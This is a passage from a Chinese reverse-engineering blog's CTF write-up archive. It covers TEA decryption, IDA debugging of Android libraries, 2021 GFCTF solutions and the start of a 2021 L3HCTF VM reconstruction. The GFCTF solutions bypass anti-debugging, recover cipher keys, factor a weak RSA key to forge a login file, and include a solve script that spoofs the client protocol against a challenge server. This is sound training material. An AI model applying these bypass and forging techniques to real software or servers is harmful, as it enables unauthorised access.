123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt; #include &lt;stdint.h&gt; //加密函数 void encrypt(uint32_t* v, uint32_t* k) &#123; uint32_t v0 = v[0], v1 = v[1], sum = 0, i; uint32_t delta = 0x12345678; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 32; i++) &#123; sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); &#125; v[0] = v0; v[1] = v1;&#125;//解密函数 void decrypt(uint32_t* v, uint32_t* k) &#123; uint32_t delta = 0x12345678; uint32_t v0 = v[0], v1 = v[1], sum = delta * 32, i; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 32; i++) &#123; v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; &#125; v[0] = v0; v[1] = v1;&#125;unsigned char byte_key[] =&#123; 0x71, 0x69, 0x68, 0x61, 0x68, 0x61, 0x69, 0x6E, 0x69, 0x6E, 0x61, 0x6E, 0x61, 0x6E, 0x61, 0x6D&#125;;//char enc[] = &#123; &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27; &#125;;int main()&#123; //uint32_t* v = (uint32_t*)enc; uint32_t v[2] = &#123; 0x000000000C65AEDA , 0x00000000ADBF8DB1 &#125;; uint32_t* k = (uint32_t*)byte_key; decrypt(v, k); printf(&quot;解密后的数据：%u %u\\n&quot;, v[0], v[1]); return 0;&#125; 后8位是 58af2715 拼凑得到 flag e0a0d966076ff43758af2715 验证成功 纪念AK RE, 拿了3一血，美滋滋 继续加油~~ 题目附件链接：https://pan.baidu.com/s/1FaBD6_FDjKLziKpVqvGe-Q提取码：ptjq","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"},{"name":"ollvm","slug":"ollvm","permalink":"https://zzzzsky.github.io/tags/ollvm/"}]},{"title":"IDA真机调试安卓so文件","slug":"IDA真机调试安卓so文件","date":"2021-11-29T05:03:23.000Z","updated":"2021-11-29T11:44:31.569Z","comments":true,"path":"2021/11/29/IDA真机调试安卓so文件/","link":"","permalink":"https://zzzzsky.github.io/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/","excerpt":"","text":"IDA真机调试安卓so文件简要看了网上很多的IDA真机调试安卓的文章，感觉很多步骤没有必要，这里整理一下最简单的实现安卓真机调试的步骤，以便以后参考，以 2021NCTF easy_mobile题目举例 步骤 首先需要一个root 后的手机，用数据线连接电脑，并且开启USB调试 电脑安装好 adb 运行adb devices 观察设备是否已经连接 来到IDA安装目录的文件夹，将 用adb push 电脑源目录 安卓的目的目录 将 dbgsrv对应的文件放到手机文件的某个目录下 运行adb shell 然后su 切换到root权限，来到对应的目录下 给 android_server 和 android_server64加可执行权限 观察此题check_flag函数在libnative-lib.so文件中，为arm64架构 运行对应的server, 这里运行的是./android_server64 端口转发adb forward tcp:23946 tcp:23946 打开IDA，拖入对应的so文件，选择Remote ARM Linux/Android debugger 11、Debugger -&gt; Process options,填写localhost，端口保持默认 12、对应的手机上安装对应的APK文件 13、IDA Debugger -&gt; Attach to process, 选择对应的进程 14、在Java_com_example_rectf_MainActivity_checkflag 函数那里下断点，手机输入flag，点验证，IDA断下 关于这个题的详细题解可以参考 https://zzzzsky.com/2021/11/29/NCTF2021_RE_WP/ 参考文章https://www.cnblogs.com/xuan52rock/p/11010304.html https://blog.csdn.net/Breeze_CAT/article/details/106298559 https://www.i4k.xyz/article/haodawei123/104060906","categories":[{"name":"安卓","slug":"安卓","permalink":"https://zzzzsky.github.io/categories/%E5%AE%89%E5%8D%93/"}],"tags":[{"name":"真机调试","slug":"真机调试","permalink":"https://zzzzsky.github.io/tags/%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95/"},{"name":"安卓","slug":"安卓","permalink":"https://zzzzsky.github.io/tags/%E5%AE%89%E5%8D%93/"}]},{"title":"2021GFCTF部分RE_WP","slug":"2021GFCTF_WP","date":"2021-11-25T09:05:00.000Z","updated":"2021-11-29T11:41:47.513Z","comments":true,"path":"2021/11/25/2021GFCTF_WP/","link":"","permalink":"https://zzzzsky.github.io/2021/11/25/2021GFCTF_WP/","excerpt":"","text":"2021GFCTF RE_WPwordy去除花指令 123456789addr =0X556AE377FD56end = 0x0556AE377FE40flag = &quot;&quot;for i in range(addr, end, 13): c = get_bytes(i+4, 1)[0] flag+=chr(c) print(flag)# GFCTF&#123;u_are2wordy&#125; BabyReverseIDA打开，去除所有的花指令 直接看下面对flag如何加密的，进入sub_412E10, 发现是SM4加密 而传入的第二个参数是key，即byte_4409c0是key，回到main函数再往上看，发现前面有一个对byte_4409c0类似RC4加密的操作, 对 byte_4409C0进行交叉引用 于是下断点调试来获取key，发现不行，猜测前面是反调试，从main函数头部下断点调试 最终定位到这个函数 采用的是self_mapping技术实现反调试，本质是创建secion的时候设置SEC_NO_CHANGE，映射后不能改变 Self-Remapping-Code 关于这个技术，可以参考下这位大佬的笔记 https://jev0n.com/2021/09/23/Self-Remapping.html 我们直接将call sub_411CE0 的地方nop掉，手动的把byte_4409c0的地方加1 12345678a = [ 0x07, 0xB8, 0x0D, 0x24, 0xB1, 0x0C, 0x2D, 0xC7, 0x28, 0x2D, 0xC3, 0x61, 0x66, 0x4F, 0x72, 0x13] addr = 0x04409C0for i in range(16): patch_byte(addr+i, a[i]+1)print(&quot;OK&quot;) 运行起来 得到key为 GF?-&gt;GirlFriend? 提取密文 10D 40 3B 87 A5 66 DA 74 92 7F BB E1 B8 CD EB BC 59 45 1B C0 38 99 AA 22 AA 3F 9D 21 07 4E 81 1F SM4在线解密 2e69df5961f20aee0897cf1905156344 , 最终得到flag为 GFCTF&#123;2e69df5961f20aee0897cf1905156344&#125; re_EasyRE_0x00IDA打开分析，最关键的是sub_100016A0函数 经过分析，发现sub_10001180是解密login.key文件，生成的数据放到V13里面 然后下面这个地方是将V13处的数据与生成的一些数据进行对比，猜测是机器码的验证 这是V13处的数据 111 55 66 55 0D 50 51 0C FF 01 80 12 CE A9 08 75 73 65 72 32 33 33 33 最后8个字符是user2333 将对比的数据也提取出来, 然后结合题目，用户名用admin6677登录，长度是9，整理得 111 55 66 55 98 FA 9B 59 6F F6 14 8F E9 DA 09 61 64 6D 69 6E 36 36 37 37 我们写脚本，每次运行到对比数据的时候就把v13的数据给他替换掉 12345data = [0x11, 0x55, 0x66, 0x55, 0x98, 0xFA, 0x9B, 0x59, 0x6F, 0xF6, 0x14, 0x8F, 0xE9, 0xDA, 0x09, 0x61, 0x64, 0x6D, 0x69, 0x6E, 0x36, 0x36, 0x37, 0x37]addr = 0x004CB348 # v13的地址for i in range(len(data)): patch_byte(addr+i, data[i])print(&quot;OK&quot;) 然后绕过机器码验证，往下走，来到sub_10001610处 可以发现，这个地方肯定是与服务器通信了，我们直接运行，直接Wireshark抓包 提取数据 1234567---&gt; 11 55 66 55 1a 27 00 00 00 00 &lt;--- 11 55 66 55 66 27 00 00 0f 00 f3 46 8a be 81 62 ed 36 d5 df 28 dc 04 8a fd ---&gt; 11 55 66 55 1a 27 01 00 40 00 0e a2 60 19 1f df 39 0d bc 62 48 57 5a 11 87 78 69 11 03 76 4b f9 2c 1f 35 fd ff 4a b8 d8 63 8f b6 b1 f0 cd d3 90 2d 27 05 b7 1e 01 22 74 91 1a a4 53 df 1d f4 69 7d 3e 29 bd d3 30 da 94 a3 03 &lt;--- 11 55 66 55 66 27 01 00 48 00 84 cb 11 ef 71 51 30 0b b3 d8 c1 22 ac c4 ca f1 29 12 cf 79 f5 36 5f 5a 5e a8 f5 fa 62 3c e8 32 69 d6 a1 54 eb 1b 06 06 b0 68 20 5a 62 ea 48 ec 8a 3d 5c 40 d0 a8 03 94 6a 2e b7 f0 e4 33 aa a0 e3 f2 da f8 a9 cf 5d 92 重新调试，接着刚才的位置往下分析，看到了RC4的初始化及加密 猜测是刚开始，服务器端返回RC4的key，然后后面全部使用RC4加密方式进行加密 根据sub_10001350这个函数可以猜测出数据包的格式, 拿上面服务器返回的key举例子 1234511 55 66 55 //标志66 27 //版本00 00 //命令0f 00 //后面数据的长度f3 46 8a be 81 62 ed 36 d5 df 28 dc 04 8a fd //数据，当命令为0的时候，是RC4的key，命令为1和2的时候，是RC4加密的数据 写脚本验证RC4加密 1234567891011121314151617181920212223242526272829303132from Crypto.Cipher import ARC4 as rc4cipherimport binasciidef rc4_algorithm(encrypt_or_decrypt, data, key1): if encrypt_or_decrypt == &quot;enc&quot;: key = key1 enc = rc4cipher.new(key) res = enc.encrypt(data) return res elif encrypt_or_decrypt == &quot;dec&quot;: key = key1 enc = rc4cipher.new(key) res = enc.decrypt(data) return reskey = binascii.unhexlify(&quot;f3468abe8162ed36d5df28dc048afd&quot;)data1 = binascii.unhexlify( &quot;0ea260191fdf390dbc6248575a118778691103764bf92c1f35fdff4ab8d8638fb6b1f0cdd3902d2705b71e012274911aa453df1df4697d3e29bdd330da94a303&quot;)m1 = rc4_algorithm(&quot;dec&quot;, data1, key)data2 = binascii.unhexlify( &quot;84cb11ef7151300bb3d8c122acc4caf12912cf79f5365f5a5ea8f5fa623ce83269d6a154eb1b0606b068205a62ea48ec8a3d5c40d0a803946a2eb7f0e433aaa0e3f2daf8a9cf5d92&quot;)m2 = rc4_algorithm(&quot;dec&quot;, data2, key)print(m1)print(m2)# b&#x27;\\x8ayqv,\\x8eYjj\\xdb\\xfa\\x10\\xd6\\xa0=\\xed!w\\xa9/\\xdd\\xa3\\x1a \\x05!+\\xbd\\xd0\\xa7\\xe7\\xd4\\xba\\t%\\xb9N\\xeeYR\\xdc\\xb0Pfq\\xae\\xe9\\xc7\\x1eB\\xa3\\x0eA\\xb3\\x08\\xcf1\\xb3\\x12\\xa5L\\xd4`\\xcc&#x27;# b&#x27;\\x00\\x10\\x00\\x80B\\x00Please update client!\\r\\nClient version=10010, Server version=10086\\x00&#x27; 结合login.key，发现当命令为1的时候，向服务器发送的是login.key的数据，然后服务器返回信息 所以现在需要构造 真正的login.key(11 55 66 55 98 FA 9B 59 6F F6 14 8F E9 DA 09 61 64 6D 69 6E 36 36 37 37) 加密后的数据 sub_10001180是解密函数，进去分析,发现是RSA的PKCS#1加密 根据这个结构找到e和n 提取出来 12345e: 65537n: 0xd928b8efe000f72db5bda67a9aa0740defb555b2603736eecd6d01f38ef2fc79分解得到p, qp = 322922590106035145437937724697895880569q = 304171468404401467258708275665013611777 利用rsatool.py生成private.pem 1python rsatool.py -e 65537 -p 322922590106035145437937724697895880569 -q 304171468404401467258708275665013611777 -o private.pem 利用在线解密网站测试 https://the-x.cn/cryptography/Rsa.aspx 发现解密成功，将构造好的数据进行加密， 对于PKCS#1的填充方式可以参考下面2篇文章 https://www.cloudcared.cn/3155.html https://www.cnblogs.com/feng9exe/p/8075447.html 然后写程序与服务器交互，发现服务器返回命令为2的验证码问题 Question(Send result in uint32_t format, 1 second!): 9540808 * 32 + 509 * 859 = ? 然后利用eval计算数值，构造，返回给服务器，即可得到flag，完整的exp如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import socketfrom Crypto.Cipher import ARC4 as rc4cipherimport reimport structlogin_key = [0x5D, 0x98, 0xEE, 0x8B, 0x68, 0x86, 0x2F, 0x56, 0xBA, 0xA1, 0x27, 0x2A, 0x68, 0x8B, 0x19, 0x31, 0x37, 0xC1, 0x2B, 0x1A, 0x80, 0x5F, 0xAB, 0x8C, 0xE0, 0xE6, 0x81, 0xDF, 0x05, 0xC6, 0xB1, 0x2F, 0x0E, 0x59, 0xC8, 0x45, 0x8A, 0x7D, 0x83, 0x35, 0x5F, 0x02, 0x05, 0x10, 0x8A, 0x35, 0x6D, 0x0C, 0xE8, 0x3C, 0x9C, 0x15, 0xD7, 0xDA, 0xF0, 0x96, 0x6D, 0x2E, 0x77, 0xEC, 0x78, 0x3B, 0x83, 0xB2]def rc4_algorithm(encrypt_or_decrypt, data, key1): if encrypt_or_decrypt == &quot;enc&quot;: key = key1 enc = rc4cipher.new(key) res = enc.encrypt(data) return res elif encrypt_or_decrypt == &quot;dec&quot;: key = key1 enc = rc4cipher.new(key) res = enc.decrypt(data) return resdef get_data(_cmd, _len, _data, _key): sig = [0x11, 0x55, 0x66, 0x55] # 签名 banben = [0x66, 0x27] # 版本 cmd_list = [_cmd, 0x00] # 命令 data_len_list = [_len, 0x00] # 数据长度 if _len != 0: return bytes(sig + banben + cmd_list + data_len_list) + rc4_algorithm(&#x27;enc&#x27;, bytes(_data), _key) return bytes(sig + banben + cmd_list + data_len_list)def get_captcha(_captcha_str): m = re.search( r&quot;Question\\(Send result in uint32_t format, 1 second!\\): (.*?) = &quot;, _captcha_str) c = eval(m.group(1)) return struct.pack(&quot;I&quot;, c)if __name__ == &#x27;__main__&#x27;: address = (&#x27;119.27.179.145&#x27;, 10086) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(address) s.send(get_data(0, 0, [], None)) data = s.recv(1024) rc4_key = data[10:] # 获取RC4密钥 s.send(get_data(1, 0x40, login_key, rc4_key)) data = s.recv(1024) captcha_str = rc4_algorithm(&quot;dec&quot;, data[10:], rc4_key).decode() captcha = get_captcha(captcha_str) # 计算得到验证码 print(f&quot;Captcha: &#123;captcha&#125;&quot;) # 向服务器返回验证码 send_data = get_data(2, len(captcha), list(captcha), rc4_key) s.send(send_data) data = s.recv(1024) m = rc4_algorithm(&quot;dec&quot;, data[10:], rc4_key) print(m) s.close() # Captcha: b&#x27;\\xc84\\x06\\x03&#x27; # b&#x27;\\x00\\x10\\x00\\x805\\x00flag_0x00 = \\x00GFCTF&#123;e8e9071b7a70770bec1f6415c4ed4c1d&#125;\\x00&#x27; 得到flag为 GFCTF&#123;e8e9071b7a70770bec1f6415c4ed4c1d&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"}]},{"title":"2021 L3HCTF 部分RE WP","slug":"2021L3HCTF_WP_RE_","date":"2021-11-17T02:00:00.000Z","updated":"2021-11-29T11:41:58.907Z","comments":true,"path":"2021/11/17/2021L3HCTF_WP_RE_/","link":"","permalink":"https://zzzzsky.github.io/2021/11/17/2021L3HCTF_WP_RE_/","excerpt":"","text":"2021 L3HCTF 部分RE WPdouble-joyIDA打开程序，找到main函数进行分析 最关键的是enc_flag 函数, 经过调试，发现传入的参数有2套，都是固定的结构体 1234567typedef struct _struc_1&#123; BYTE* pKey; //指向OPCODE _DWORD* pFlag; //指向FLAG，主要这个FLAG前40个字节是用户输入的，后面一大部分要留给程序用 int i; //指向OPCODE的索引 int stack; //指向了一些 “操作数”，在OPCODE 中存着，比如OPCODE是 \\XE的话，后面4个字节就是一个“操作数”&#125;struc_1; 进入 enc_flag函数，F5，发现很乱，然后patch掉一些用于对齐的代码后，F5, 发现是个VM 调试，发现一共执行了0XCA次 enc_flag, 并且传入的参数是交替的 还原程序代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334#include &lt;windows.h&gt;#include &lt;basetsd.h&gt;#include &lt;stdio.h&gt;typedef unsigned int uint32;#define _DWORD uint32typedef struct _struc_1&#123; BYTE* pKey; //指向OPCODE _DWORD* pFlag; //指向FLAG，主要这个FLAG前40个字节是用户输入的，后面一大部分要留给程序用 int i; //指向OPCODE的索引 int stack; //指向了一些 “操作数”，在OPCODE 中存着，比如OPCODE是 \\XE的话，后面4个字节就是一个“操作数”&#125;struc_1;BYTE key1[] =&#123; 0x11, 0x15, 0x00, 0x00, 0x00, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0E, 0x15, 0xCD, 0x5B, 0x07, 0x08, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x0E, 0xB1, 0x68, 0xDE, 0x3A, 0x08, 0x0E, 0x12, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x44, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x01, 0x01, 0x01, 0x01, 0x02, 0x07, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0xA8, 0xFF, 0xFF, 0xFF, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x4C, 0x49, 0x00, 0x00, 0x08, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x76, 0x6F, 0x00, 0x00, 0x08, 0x0E, 0x02, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x20, 0x65, 0x00, 0x00, 0x08, 0x0E, 0x03, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x55, 0x43, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x56, 0x01, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x20, 0x01, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x10, 0x00, 0x00, 0x00, 0x02, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x20, 0x00, 0x00, 0x00, 0x0C, 0x03, 0x07, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x03, 0x00, 0x00, 0x00, 0x05, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x07, 0x00, 0x08, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x09, 0x00, 0x08, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x10, 0x00, 0x00, 0x00, 0x02, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x20, 0x00, 0x00, 0x00, 0x0C, 0x03, 0x07, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x08, 0x00, 0x00, 0x0C, 0x03, 0x0E, 0x03, 0x00, 0x00, 0x00, 0x05, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x07, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x08, 0x12, 0x01, 0x00, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0xCC, 0xFE, 0xFF, 0xFF, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x02, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0x96, 0xFE, 0xFF, 0xFF, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;BYTE key2[] =&#123; 0x11, 0x15, 0x00, 0x00, 0x00, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0E, 0xF7, 0xCB, 0x54, 0x01, 0x08, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x0E, 0xAD, 0xDE, 0xED, 0x5E, 0x08, 0x0E, 0x12, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x44, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x01, 0x01, 0x01, 0x01, 0x02, 0x07, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0xA8, 0xFF, 0xFF, 0xFF, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x54, 0x53, 0x00, 0x00, 0x08, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x4D, 0x4F, 0x00, 0x00, 0x08, 0x0E, 0x02, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x74, 0x20, 0x00, 0x00, 0x08, 0x0E, 0x03, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x61, 0x65, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x5B, 0x01, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x25, 0x01, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x09, 0x00, 0x08, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x10, 0x00, 0x00, 0x00, 0x02, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x20, 0x00, 0x00, 0x00, 0x0C, 0x03, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x07, 0x07, 0x00, 0x08, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x10, 0x00, 0x00, 0x00, 0x02, 0x0E, 0x02, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x20, 0x00, 0x00, 0x00, 0x0C, 0x03, 0x0E, 0x03, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x07, 0x07, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x08, 0x12, 0x01, 0x00, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0xC7, 0xFE, 0xFF, 0xFF, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x02, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0x91, 0xFE, 0xFF, 0xFF, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;void enc_flag(struc_1* st)&#123; BYTE* pKey = st-&gt;pKey; BYTE opcode = 0; _DWORD* pFlag = st-&gt;pFlag; int data1, data2, tmp, index; while (true) &#123; opcode = pKey[st-&gt;i]; //取出对应的opcode st-&gt;i++; //每取出一个opcode， 索引就+1 printf(&quot;------&gt;OPCODE :%d\\n&quot;, opcode); switch (opcode) &#123; case 0: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 + data2; printf(&quot;pFlag[%d] = 